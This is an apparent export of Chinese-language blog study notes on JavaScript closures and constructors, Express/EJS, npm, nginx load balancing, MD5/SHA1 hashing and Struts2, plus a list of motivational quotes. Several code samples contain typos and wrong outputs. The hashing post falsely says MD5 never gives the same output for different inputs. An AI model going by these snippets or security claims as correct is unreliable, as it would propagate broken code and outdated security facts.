调用对象方法由于对象方法实际上只是一个函数类型属性，因此它们的访问方式与属性完全相同。即用点号表示法或中括号表示法均可。而其调用方式也与其他函数相同，在指定的方法名后加一对括号即可。例如下面的say方法:1234567var hero = &#123; breed:'Turtle', occuptation:'Ninja', say:function() &#123; return 'I am ' + hero.occupation;&#125;&#125; >&gt;&gt; hero.say();‘I am Ninja’如果调用方法时需要传递一些参数，做法也和一般函数一样，例如:>&gt;&gt; hero.say(‘a’,’b’,’c’);另外，由于我们可以像访问数组一样用中括号来访问属性，因此这意味着我们同样可以用中括号来调用方法，尽管这种做法在实践中并不常见。>&gt;&gt; hero‘say’; 修改属性与方法首先创建一个空对象:>&gt;&gt; var hero={};这时候，如果我们访问一个不存在的属性，就会:>&gt;&gt; typeof hero.breed“undefined”现在，我们来为该对象添加一些属性和方法:>&gt;&gt; hero.breed = ‘turtle’;>&gt;&gt; hero.name = ‘Leonardo’;>&gt;&gt; hero.sayName = function() {return hero.name;};然后调用该方法:>&gt;&gt; hero.sayName();‘Leonardo’接下来，我们删除一个属性;>&gt;&gt; delete hero.name;true然后再调用该方法，它就不能正常工作了;>&gt;&gt; hero.sayName();reference to undefined property hero.name 使用this值当我们处于某个对象方法内部时，还可以用另外一种方法来访问同一对象的属性，即该对象的特殊值this。123456var hero = &#123; name: 'Rafaelo', sayName:function()&#123; return this.name;&#125;&#125; >&gt;&gt; hero.sayName();‘Rafaelo’也就是说，当我们引用this值时，实际上所引用的就是“这个对象”或者“当前对象”。 构造器函数我们可以通过构造函数的方式来创建对象，下面来看一个例子:123function Hero()&#123; this.occupation='Ninja';&#125; 为了能使用该函数来创建对象，我们需要使用new操作符，例如:>&gt;&gt; var hero =new Hero();>&gt;&gt; hero.occupation;‘Ninja’使用构造器函数的好处在于，它可以在创建对象时接收一些参数。下面，我们就来修改一下上面的构造函数，使它可以通过接收参数的方式来设定name属性:1234567function Hero (name)&#123; this.name = name; this.occupation = 'Ninja'; this.whoAreYou=function()&#123; return "I'm" + this.name +"and I 'm a" + this.occupation;&#125;&#125; 现在，我们就能利用同一个构造器来创建不同的对象了:>&gt;&gt; var h1 = new Hero(‘Michelangelo’);>&gt;&gt; var h2 = new Hero(‘Donatello’);>&gt;&gt; h1.whoAreYou();“I’m Michelangelo and I’m a Ninja”>&gt;&gt; h2.whoAreYou();“I’m Donatello and I’m a Ninja”如果我们在调用一个构造器函数时忽略了new操作符，尽管不会出错，但结果可能出乎意料，例如:>&gt;&gt; var h= Hero(‘Leonardo’);>&gt;&gt; typeof h“undefined”在这种情况下，this指向的是全局 对象 全局对象程序所在的宿主环境一般都会为其提供一个全局对象，而所谓的全局变量其实都只不过是该对象的属性罢了。例如当程序的宿主环境是web浏览器时，它所提供的全局对象就是windows。我们来看一个实例，首先，我们在所有函数之外声明一个全局变量。>&gt;&gt; var a = 1;然后，我们就可以通过各种不同的方式来访问该全局变量了: 可以当做一个变量a来访问。 也可以当做全局对象的一个属性来访问，例如window[‘a’]或window.a;现在，让我们回过头去分析一下刚才那个不使用new操作符调用构造器函数的情况，那时候，this值指向的是全局对象，并且所有的属性设置都是针对this所代表window对象的。也就是说，当我们声明了一个构造函数，但又不通过new调用它时，代码就会返回’undefined’>&gt;&gt; function Hero(name){this.naem=name;}>&gt;&gt; var h = Hero(‘Leonardo’);>&gt;&gt; typeof h“undefined”>&gt;&gt; typeof h.nameh has no properties由于我们在Hero中使用了this，所以这里就会创建一个全局变量(同时也是全局对象的一个属性)。>&gt;&gt; name“Leonardo”>&gt;&gt; window.name“Leonardo”而如果我们使用new来调用相同的构造函数，我们就会创建一个新对象，并且this也会自动指向该对象。>&gt;&gt; var h2 = new Hero(‘Michelangelo’);>&gt;&gt; typeof h2“object”>&gt;&gt; h2.name“Michelangelo”构造器属性当我们创建对象时，实际上同时也赋予了该对象一种特殊的属性=即构造器属性，该属性实际上是一个指向用于创建该对象的构造器函数的引用。>&gt;&gt; h2.constructorHero(name)当然，由于构造器属性所引用的是一个函数，因此我们也可以利用它来创建一个其他新对象。例如像下面这样，大意就是:”无论对象H2有没有被创建，我们都可以用它来创建另一个对象”.>&gt;&gt; var h3 = new h2.constructor(‘Rafaello’);>&gt;&gt; h3.name;“Rafaello”另外，如果对象是通过对象文本标识符创建的，那么实际上它就是由內建构造函数Object()函数所创建的。>&gt;&gt; var o = {};>&gt;&gt; o.constructor;Object()>&gt;&gt; typeof o.constructor;“function”]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[闭包的应用]]></title>
    <url>%2F2017%2F02%2F18%2Ffirst%2F</url>
    <content type="text"><![CDATA[闭包实现Getter和Setter我们需要将getter和setter这两个函数放在一个共同的函数中，并在该函数中定义secret变量，这使得两个函数能够共享同一作用域，具体代码如下:12345678910var getValue,setValue;(function()&#123; var secret = 0; getValue = function()&#123; return secret;&#125;; setValue = function(v)&#123; secret = v;&#125;;&#125;)(); >&gt;&gt; getValue()0>&gt;&gt; setValue(123)>&gt;&gt; getValue()123 闭包实现迭代器下面是一个接受数组输入的初始化函数，我们在其中定义了一个私有指针，该指针会始终指向数组中的下一个元素。123456function setup(x)&#123; var i = 0; return function() &#123; return x[i++];&#125;;&#125; 现在我们只需要一组数据来调用一下setup(),就会创建出我们所需要的next()函数，具体如下：>&gt;&gt; var next = setup([‘a’,’b’,’c’]);这是一种既简单又好玩的循环形式:我们只需要重复调用一个函数，就能获取下一个元素。>&gt;&gt; next();‘a’>&gt;&gt; next();‘b’>&gt;&gt; next();‘c’]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[req.query、req.params和req.body的区别]]></title>
    <url>%2F2017%2F02%2F17%2Fforth%2F</url>
    <content type="text"><![CDATA[req.params获取路由中的参数，例如/shouyi/:user/helloword,用户访问的时候为/shouyi/shitou/helloword那么取得时候就是req.params.user,user其实在url里面起到的作用是变量，user的值就是shitou了。 req.queryreq.query获取路由?后的参数，例如/api/users?name=shitou。 req.bodyreq.body获取form提交参数可以是form表单也可以是自己打包的数据，一定是post请求，express里依赖的中间件必须有bodyParser。 路由express.Router在myblog目录下创建空文件夹routes，在routes目录下创建index.js和users.js。最后代码如下:index.js1234567var express = require('express');var app = express();var indexRouter = require('./routes/index');var userRouter = require('./routes/users');app.use('/',indexRouter);app.use('/user',userRouter);app.listen(3000); routes/index.js123456var express = require('express');var router = express.Router();router.get('/',function(req,res)&#123; res.send('hello ,express');&#125;);module.exports=router; routes/user.js123456var express = require('express');var router = express.Router();router.get('/:name',function(req,res)&#123; res.send('hello ,'+req,params.name);&#125;);module.exports = router; 以上代码的意思是：我们将/和/users/:name的路由分别放到了routes/index.js和routes/users.js中，每个路由文件通过生成一个express.Router实例router导出，通过app.use挂载到不同的路径。这两种代码实现了相同的功能，但在实际开发中推荐使用express.Router将不同的路由分离到不同的路由文件中。]]></content>
      <categories>
        <category>NodeJs</category>
        <category>express</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[exports和module.exports的区别]]></title>
    <url>%2F2017%2F02%2F17%2Ffirst%2F</url>
    <content type="text"><![CDATA[总结require用来加载代码，而exports和module.exports则用来导出代码。首先我们先来看一下js基础。test.js12345678910var a = &#123;name:1&#125;;var b = a;console.log(a);console.log(b);b.name=2;console.log(a);console.log(b);var b = &#123;name:3&#125;;console.log(a);console.log(b); 运行test.js结果为:123456&#123;name:1&#125;&#123;name:1&#125;&#123;name:2&#125;&#123;name:2&#125;&#123;name:2&#125;&#123;name:3&#125; 解释：a是一个对象，b是对a的引用，即a和b指向同一块内存，所以前两个输出一样。当对b作修改时，即a和b指向同一块内存地址的内容发生了改变，所以a也会体现出来，所以第三四个输出一样，当b被覆盖时，b指向了一块新的内存，a还是指向原来的内存，所以最后两个输出不一样。明白了上述例子，我们只需知道三点就知道exports和module.exports的区别了: module.exports初始值为一个空对象{} exports是指向的module.exports的引用 require()返回的是module.exports而不是exports常用写法exports=module.exports={…}上面的代码等价于module.exports={…}exports=module.exports原理很简单:module.exports指向新的对象时，exports断开了与module.exports的引用，那么通过exports=module.exports让exports重新指向module.exports。]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[npm版本控制]]></title>
    <url>%2F2017%2F02%2F17%2Fsecond%2F</url>
    <content type="text"><![CDATA[npm init使用npm init 初始化一个空项目是一个好的习惯，即使你对package.json及其他属性非常熟悉，npm init 也是你开始写新的Node.js应用或模块的一个快捷的方法。npm init有智能的默认选项，比如从根目录名称推断模块名称，通过~/.npmrc读取你的信息，用你的Git设置来确定repository等等。 npm installnpm install使我们最常用的npm命令之一。因此我们需要好好了解一下这个命令。终端输入npm install -h 查看使用方式可以看出我们通过npm install可以安装npm上发布的某个版本、某个tag、某个版本区间的模块，甚至可以安装本地目录、压缩包和git/github的库作为依赖。直接使用npm i安装的模块是不会写入package.json的dependencies，需要额外加个参数: npm i express –save /npm i express -s(安装express,同时将”express”:”^4.14.0”写入dependencies) npm i exoress –save-dev /npm i express -D(安装express,同时将”express”:”^4.14.0”写入devDependencies) npm i express –save –save-exact(安装express，同时将”express”:”^4.14.0”,写入dependencies)运行以下命令:npm config set save-exact true这样每次npm i xxx –save 的时候会锁定依赖的版本号，相当于加了–save-exact参数。npm shrinkwrap前面说过要锁定依赖的版本，但这并不能完全防止意外情况的发生，因为锁定的只是最外一层的依赖，而里层依赖的模块的package.json有可能写的是”mongoose”:”*”。为了彻底锁定依赖的版本，让你的应用在任何机器上安装的都是同样的版本的模块，通过运行npm shrinkwrap，会在当前目录下产生一个npm-shrinkwrap.json，里面包含了通过node_modules计算出的模块的依赖树及版本。优先执行npm-shrinkwrap.json]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[express和supervisor]]></title>
    <url>%2F2017%2F02%2F17%2Fthird%2F</url>
    <content type="text"><![CDATA[启动express我们新建一个目录myblog，在该目录下运行npm init生成一个package.json,如下所示:然后安装express并写入package.json:npm i express@4.14.0 –save新建index.js，添加如下代码:123456var express = require('express');var app=express();app.get('/',function(req,res)&#123; res.send('hello,express');&#125;);app.listen(3000); 以上代码的意思是:生成一个express实例app，挂载了一个根路由控制器，然后监听3000端口并启动程序。运行node index，打开浏览器访问localhost:3000时，页面应显示hello,express。 supervisor在开发过程中，每次修改代码保存后，我们都需要手动重启程序，才能查看改动的效果，使用supervisor可以解决这个繁琐的问题，全局安装supervisor。npm install -g supervisor运行 supervisor –harmony index 启动程序。supervisor会监听当前目录下node和js后缀的文件，当这些文件发生改变时 ，supervisor会自动重启程序。]]></content>
      <categories>
        <category>NodeJs</category>
        <category>express</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模板引擎]]></title>
    <url>%2F2017%2F02%2F17%2Ffifth%2F</url>
    <content type="text"><![CDATA[ejs模板引擎安装npm i ejs –save修改index.js如下:index.js12345678910var path = require('path');var express = require('express');var app = express();var indexRouter = require('./routes/index');var userRouter = require('./routes/users');app.set('views',path.join(__dirname,'views'))//设置放模板文件的位置app.set('views engine','ejs');//设置模板引擎为ejsapp.use('/',indexRouter);app.use('/users',userRouter);app.listen(3000); 通过app.set设置模板引擎为ejs和存放模板的目录。在myblog下新建views文件夹，在views下新建users.ejs。views/users.ejs123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;style type="text/css"&gt; body&#123;padding:50px;font:14px "Lucids Grande", Helvetics,Arial,sans-serif;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= name.toUpperCase() %&gt;&lt;/h1&gt; &lt;p&gt;hello ,&lt;%= name %&gt;&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; routes/user.js12345var express = require('express');var router = express.Router();router.get('/:name',function(req,res)&#123; res.render('users',&#123;name:req.params.name&#125;);&#125;); 通过调用res.render函数渲染ejs模板，res.render第一个参数是模板的名字，这里则会匹配views/users.ejs,第二个参数是传给模板的数据，这里传入name，则在ejs模板可使用name。res.render的作用就是将模板和数据结合生成html，同时设置响应头中的Content-Type:text/html,告诉浏览器我返回的是html，不是纯文本，要按html展示。现在我们访问localhost:3000/users/haha。ejs常用标签： &lt;% code %&gt;:运行JavaScript代码，不输出 &lt;%= code %&gt;:显示转义后的HTML内容 &lt;%- code %&gt;:显示原始HTML内容下面的例子解释&lt;% code %&gt;的用法:Datasupplies:{‘mop’,’broom’,’duster’}Template12345&lt;ul&gt; &lt;% for(var i=0;i&lt;supplies.length;i++)&#123;%&gt; &lt;li&gt;&lt;%= supplies[i] %&gt;&lt;/li&gt; &lt;% &#125; %&gt;&lt;/ul&gt; Result12345&lt;ul&gt; &lt;li&gt;mop&lt;/li&gt; &lt;li&gt;broom&lt;/li&gt; &lt;li&gt;duster&lt;/li&gt;&lt;/ul&gt; includes我们使用模板引擎通常不是一个页面对应一个模板，这样就失去了模板的优势，而是把模板拆成可复用的模板片段组合使用，如在views下新建header.ejs和footerejs，并修改users.ejsviews/header.ejs12345678&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123;padding:50px;font: 14px &quot;Lucids Grande&quot;,Helvetica,Arical,sans-serif;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; views/footer.ejs12 &lt;/body&gt;&lt;/html&gt; views/users.ejs1234&lt;% - include('header') %&gt; &lt;h1&gt;&lt;%= name.toUpperCase() %&gt;&lt;/h1&gt; &lt;p&gt; hello ,&lt;%= name %&gt;&lt;/p&gt;&lt;% - include('footer') &amp;&gt; 拆分的好处是1.模板可复用，减少重复代码2.主模板结构清晰]]></content>
      <categories>
        <category>NodeJs</category>
        <category>express</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数类型回顾]]></title>
    <url>%2F2017%2F02%2F17%2Fsixth%2F</url>
    <content type="text"><![CDATA[匿名函数的调用function(a){return a;} 我们可以将匿名函数作为参数传递给其他函数，这样，接收方函数就能利用我们所传递的函数来完成某些事情。 我们可以定义某个匿名函数来执行某些一次性任务。实例：12345678910function invoke_and_add(a,b)&#123; return a()+b();&#125;function one()&#123; return 1;&#125;function two()&#123; return 2;&#125;invoke_and_add(one,two); 这也就是下面要说的回调函数。 回调函数回调示例：12345678910function multiplyByTwo(a,b,c)&#123; var i,ar=[]; for(i=0;i&lt;3;i++)&#123; ar[i]=arguments[i]*2;&#125; return ar;&#125;function addOne(a)&#123; return a+1;&#125; 测试>&gt;&gt;multiplyByTwo(1,2,3);[2,4,6]>&gt;&gt;addOne(100)101>&gt;&gt;var myarr=[];>&gt;&gt;myarr=multiplyByTwo(10,20,30);[20,40,60]>&gt;&gt;for(var i=0;i&lt;3;i++){myarr[i]=addOne(myarr[i]);}>&gt;&gt;myarr[21,40,60]回调改善1234567function multiplyByTwo(a,b,c,callback)&#123; var i,ar=[]; for(i=0;i&lt;3;i++)&#123; ar[i]=callback(arguments[i]*2);&#125; return ar;&#125; 自调函数12345&#123; function()&#123; alert('boo');&#125;&#125;(); 内嵌函数123456function a(param)&#123; function b(theinput)&#123; return theinput*2;&#125;; return 'The result is'+b(param);&#125;; 123456var a=function(param)&#123; var b=function(theinput)&#123; return theinput*2;&#125;; return 'The result is'+b(param);&#125; >&gt;&gt; a(2);“The result is 4”>&gt;&gt; a(8);“The result is 16”>&gt;&gt; b(2)b is not defined 以函数为返回值的函数实例:123456function a()&#123; alert('A!'); return function()&#123; alert('B!');&#125;;&#125; >&gt;&gt; var newFunc=a();>&gt;&gt; newFunc(); 能重定义自身的函数实例:123456function a()&#123; alert('A!');; a=function()&#123; alert('B!');&#125;;&#125; 闭包利用闭包突破作用域链闭包1实例:123456function f()&#123; var b="b"; return function()&#123; return b;&#125;&#125; >&gt;&gt; bb is not defined接下来，我们来看一下f()的返回值。这是另一个函数，我们可以把它看做上图中的函数N，该函数有自己的使用空间，同时也可以访问f()的空间和全局空间，所以b对它来说也是可见的。因为f()是可以在全局空间中被调用的，所以我们可以将它的返回值赋值给另一个全局变量，从而生成一个可以访问f()私有空间的新全局函数。闭包2实例:1234567var n;function f()&#123; var b="b"; n=function()&#123; return b;&#125;&#125; >&gt;&gt; f();我们在f()中定义了一个函数，并且没有在这里使用var语句，因此它应该是属于全局的，由于n()是在f()内部定义的，它可以访问f()的作用域，所以即使该函数后来升级成了全局函数，但它依然可以保留对f()作用域的访问权。>&gt;&gt; n()“b”闭包3实例:1234567function f(arg) &#123; var n=function()&#123; return arg;&#125;; arg++; return n;&#125; >&gt;&gt; var m=f(123);>&gt;&gt; m();124循环中的闭包实例:12345678910function f()&#123; var a = []; var i; for(i = 0;i &lt; 3;i++)&#123; a[i] = function()&#123; return i; &#125;&#125; return a;&#125; >&gt;&gt; var a = f()这时我们得到了一个数组函数，就来执行吧>&gt;&gt; a[0]()3>&gt;&gt; a[1]()3>&gt;&gt; a[2]()3你们大概想的都是0,1,2吧，但是其实不然，因为这跟内存有关了，i是一个变量名，它指向的是i的内存，内存里面是什么，它就会是什么，那么最后一次循环，是从i=3结束的，所以i最终等于3.那么输出的也就是3.显然我们需要三个三个变量或者选择闭包。123456789101112function f()&#123; var a = []; var i; for(i = 0;i&lt;3;i++)&#123; a[i] = (function(x)&#123; retrun function()&#123; return x; &#125; &#125;)(i);&#125; return a;&#125; 这样就能获得我们预期的结果了>&gt;&gt; var a = f();>&gt;&gt; a[0]();0>&gt;&gt; a[1]();1>&gt;&gt; a[2]();2或者我们也可以定义一个正常点，不使用自调函数的内部函数来实现相同的功能。关键是在每次迭代操作中，我们要在中间函数内将i的值本地化。12345678910111213function f()&#123; function makeClosure(x)&#123; return function()&#123; return x; &#125;&#125; var a = []; var i; for(i=0;i&lt;3;i++)&#123; a[i] = makeClosure[i];&#125; return a;&#125;]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[感悟1]]></title>
    <url>%2F2017%2F02%2F16%2Ffirst%2F</url>
    <content type="text"><![CDATA[语录 冬天到了，春天还会远吗？ 平静的湖面练不出精悍的水手，顺利的环境造不出时代的伟人。 世界上本没有路，走的人多了也就变成了路。 梅须逊雪三分白，雪却输梅一段香。 和喜欢的人吵架，和陌生人说心里话。 世界上唯一不变的，就是一切都在变。 人生就像一杯茶，不会苦一辈子，但总会苦一阵子。 人生如果错了方向，停止就是进步。 理想很丰满，现实很骨感。 男人一有钱就变坏，女人一变坏就有钱。 你若安好，便是晴天。 人生没有彩排，每一天都是现场直播。 怕爹是孝顺，怕老婆是爱情。 一个人炫耀什么，说明内心缺少什么。 试金可以用火，试女人可以用金，试男人可以用女人。 攀比是产生烦恼的根源。 只要路是对的，就不怕路远。 不要因为一点瑕疵而放弃一段爱情，毕竟在爱情里，需要的是真情，而不是完美。很多时候，我们视为刻骨铭心的记忆，而别人却早已忘记，与其纠结于心，不如看淡，看轻。 你一天的爱心可能带来别人一生的感谢。 你脑子里东西的多寡，就关系着你将来的前途。你希望掌握永恒，那你必须控制现在。 该来的都会来，该走的全会走，别抗拒，别挽留，别贪恋，别不舍，别担心。学着看淡一些事情，才是对自己最好的保护。 人生的烦恼，多在于知道的太多，而做的太少。 过去酒逢知己千杯少，现在酒逢千杯知己少。 生气是拿别人的错误惩罚自己。 把事情变复杂很简单，把事情变简单很复杂。 爱情永远比婚姻圣洁，婚姻永远比爱情实惠。 叹气是最浪费时间的事情，哭泣是最浪费力气的行径。 世界上最远的距离，不是爱，不是恨，而是熟悉的人，渐渐变得陌生。 择一城终老，遇一人白首。 低头要有勇气，抬头要有底气。 缘分是一本书，翻的不经意会错过，读得太认真会流泪。 成功的人不是赢在起点，而是赢在转折点。 简单的事情重复做，你就是专家，重复的事用心做，你就是赢家。 感受生活只能向前看，而理解生活只能向后看。 在你成为领导以前，成功只同自己的成长有关，当你成为领导以后，成功都同别人的成长有关。 如果你简单，这个世界就对你简单。 真心等你的人，他总会真心等下去，不愿意等你的人，总是一转身就牵了别人的手。 漂亮只能为别人提供眼福，却不一定换到幸福。 如果说我懂得的道理比别人多一点，那是因为我犯得错误比别人多一点。 如果我能够看到自己的背影，我想它一定很忧伤，因为我把快乐都留在了前面。 年轻时候，拍下许多照片，摆在客厅给别人看；等到老了，才明白照片是拍给自己看的。 理想和现实总是有差距的，幸好还有差距，不然，谁还稀罕理想？ 美丽让男人停下，智慧让男人留下。 世界太大还是遇见你，世界太小还是丢了你。 当我们搬开别人架下的绊脚石时，也许恰恰是在为自己铺路。 真坏人并不可怕，可怕的是假好人。 喜欢一个人，就是在一起很开心；爱一个人，就是即使不开心，也想在一起。 要成功，需要朋友，要取得巨大的成功，需要敌人 不是每句“对不起”，都能换来“没关系”。 做与不做的最大区别是：后者拥有对前者的评论权。 爱情不是轰轰烈烈的誓言，而是平平淡淡的陪伴。 人生最精彩的不是实现梦想的瞬间，而是坚持梦想的过程。 朋友就是把你看透了，还能喜欢你的人。 情侣间最矛盾的地方就是幻想彼此的未来，却惦记着对方的过去。 不要浪费你的生命，在你一定会后悔的地方上。 当你知道迷惑时，并不可怜，当你不知道迷惑时，才是最可怜的。 我对她好，其实是我不好，她对我不好，其实是对我好。]]></content>
      <categories>
        <category>心灵鸡汤</category>
      </categories>
      <tags>
        <tag>领悟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用加密算法]]></title>
    <url>%2F2017%2F02%2F13%2Fsecond%2F</url>
    <content type="text"><![CDATA[MD5加密算法 算法简介MD5的全称是Message-Digest Algorithm 5（信息-摘要算法），在90年代初由Mit Laboratory for Computer Science和Rsa data security inc的Ronald l. rivest开发出来，经md2、md3和md4发展而来。它的作用是让大容量信息在用数字签名软件签署私人密匙前被“压缩”成一种保密的格式（就是把一个任意长度的字节串变换成一定长的大整数）.不管是md2、md4还是md5，它们都需要获得一个随机长度的信息并产生一个128位的信息摘要.MD5 算法的哈希值大小为 128 位。是一种不可逆的算法。 算法特点两个不同的明文不会得到相同的输出值MD5结果不能反推明文，不可逆 安全性从安全的角度讲，MD5的输出为128位，若采用纯强力攻击寻找一个消息具有给定Hash值的计算困难性为2128，用每秒可试验1000000000个消息的计算机需时1.07×1022年。若采用生日攻击法，寻找有相同Hash值的两个消息需要试验264个消息，用每秒可试验1000000000个消息的计算机需时585年。实际应用上，例如我知道‘password’的MD5值是5f4dcc3b5aa765d61d8327deb882cf99，那么我就用一个数据库存起来，只要我看到5f4dcc3b5aa765d61d8327deb882cf99，我就知道这个是口令‘password‘使用MD5处理之后的值，原来的口令就是’password’。MD5在身份鉴别系统中用于口令保护已经是很久了事情了，大部分黑客也有针对这种Hash方式准备相应的数据库进行反查，这种数据库称为彩虹表，MD5的安全性大大减弱。 node实现MD5加密例程 12345var crypto = require('crypto');var content = 'password'var md5 = crypto.createHash('md5');md5.update(content);var d = md5.digest('hex'); //MD5值是5f4dcc3b5aa765d61d8327deb882cf99 SHA1算法 算法简介SHA1的全称是Secure Hash Algorithm(安全哈希算法)。加密哈希函数将任意长度的二进制字符串映射为固定长度的小型二进制字符串。加密哈希函数有这样一个属性：在计算上不大可能找到散列为相同的值的两个不同的输入；也就是说，两组数据的哈希值仅在对应的数据也匹配时才会匹配。数据的少量更改会在哈希值中产生不可预知的大量更改。所以你很难从加密后的文字中找到蛛丝马迹。SHA1 算法的哈希值大小为 160 位。是一种不可逆的算法。 SHA1加密例程12345var crypto = require('crypto');var content = 'password'var shasum = crypto.createHash('sha1');shasum.update(content);var d = shasum.digest('hex'); MD5与sha1的不同点MD5 使用小端排序LITTLE-ENDIAN，sha1 使用大端排序BIG-ENDIANMD5最后生成的摘要信息是16个字节，SHA1是20个字节。]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node集群与nginx负载均衡]]></title>
    <url>%2F2017%2F02%2F13%2Ffirst%2F</url>
    <content type="text"><![CDATA[多机器的均衡1npm install http-proxy 负载均衡示例12345678910111213141516var proxyServer = require('http-proxy');var port = parseInt(process.argv[2]);var servers=[&#123; host:"localhost", port:8081&#125;,&#123; host:"localhost", port:8080&#125;];proxyServer.createServer(function(req,res,proxy)&#123; var target =servers.shift(); proxy.proxyRequest(req,res,target); servers.push(target);&#125;).listen(port); 使用nginx负载均衡123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#user nobody;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid logs/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] "$request" ' # '$status $body_bytes_sent "$http_referer" ' # '"$http_user_agent" "$http_x_forwarded_for"'; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; upstream node_app &#123; server 127.0.0.1:8080; server 127.0.0.1:8081; &#125; server &#123; listen 80; server_name localhost; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root html; index index.html index.htm; &#125; location /foo &#123; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; proxy_set_header X-NginX-Proxy true; proxy_set_header Connection ""; proxy_http_version 1.1; proxy_pass http://node_app; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\.ht &#123; # deny all; #&#125; &#125; # another virtual host using mix of IP-, name-, and port-based configuration # #server &#123; # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125; # HTTPS server # #server &#123; # listen 443; # server_name localhost; # ssl on; # ssl_certificate cert.pem; # ssl_certificate_key cert.key; # ssl_session_timeout 5m; # ssl_protocols SSLv2 SSLv3 TLSv1; # ssl_ciphers HIGH:!aNULL:!MD5; # ssl_prefer_server_ciphers on; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125;&#125; upstream服务器upstream node_app { server 127.0.0.1:8080; server 127.0.0.1:8081;}处理请求 任何的到/foo的请求都会被代理到之前配置的nodejs服务器上1234567891011location /foo &#123; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; proxy_set_header X-NginX-Proxy true; proxy_set_header Connection ""; proxy_http_version 1.1; proxy_pass http://node_app;&#125;]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH2之Struts2学习二]]></title>
    <url>%2F2017%2F01%2F23%2Ffirst%2F</url>
    <content type="text"><![CDATA[动态方法调用/struts2/list!方法名.action控制是否启用动态方法的调用的常量是12&lt;constant name="struts.enable.DynamicMethodInvocation" value="false"/&gt; //false为禁止使用 使用通配符调用action123&lt;action name="list_*" class="cn.itcast.action" method="&#123;1&#125;"&gt; &lt;result name="success"&gt;/WEB-INF/page/message.jsp&lt;/result&gt;&lt;/action&gt; 接受请求参数(get/post)struts主要采用的就是反射机制通过action里面的set,get方法进行反射，得到用户发送的数据和发给用户的数据。复合型数据接受12345678910111213141516public class Person&#123; private int id; private String name; public void setId(int id)&#123; this.id=id;&#125; public int getId()&#123; return id;&#125; public String setName(String name)&#123; this.name=name;&#125; public String getName()&#123; return name;&#125;&#125; 表单格式1234&lt;form action="&lt;%=request.getContextPath()%&gt;/control/employee/list_execute" method="post"&gt; id:&lt;input type="text" name="person.id"/&gt;&lt;br/&gt; name:&lt;input type="text" name="person.name"/&gt;&lt;br/&gt;&lt;/form&gt; 类型转换器局部类型转换器: 必须继承DefaultTypeConverter 123456789101112131415161718192021import java.text.SimpleDateFormat;import java.util.Date;import java.util.Map;import com.opensymphony.xwork2.conversion.impl.DefaultTypeConverter;public class DateTypeConverter extends DefaultTypeConverter&#123; @Override public Object convertValue(Map&lt;String,Object&gt; context,Object value,Class toType)&#123; SimpleDateFormat dateFormat=new SimpleDateFormat("yyyyMMdd"); try&#123; if(toType==Date.class)&#123; String[] params=(String[]) value; return dateFormat.parse(param[0]);&#125; else if(toType==String.class)&#123; Date date=(Date) value; return dateFormat.format(date);&#125;&#125;catch(ParseException e)&#123; return null; &#125;&#125; 注册类型转换器建立Applet，文件名为ActionClassName-conversion.properties内容为birthday=cn.item.converter.DateTypeConverter.全局类型转换器:文件名为xwork-conversion.properties内容为java.util.Date=cn.item.converter.DateTypeConverter 访问或添加request/session/application属性利用ActionContext达到效果 1234567public String execute()&#123; ActionContext ctx = ActionContext.getContext(); ctx.getApplication().put("app","应用范围"); ctx.getSession().put("ses","session范围"); 